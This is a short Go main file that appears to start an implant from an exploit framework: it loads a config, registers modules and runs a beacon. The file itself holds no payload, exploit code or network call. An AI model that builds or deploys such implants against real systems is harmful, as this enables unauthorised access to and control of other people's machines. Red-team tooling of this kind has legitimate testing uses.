package main

import (
	"log"

	"github.com/KKingZero/erebus-exploit-framwork/implant"
	_ "github.com/KKingZero/erebus-exploit-framwork/implant/modules" // Register modules via init()
)

func main() {
	cfg, err := implant.LoadConfig()
	if err != nil {
		log.Fatalf("load config: %v", err)
	}

	beacon := implant.New(cfg)
	beacon.Run()
}
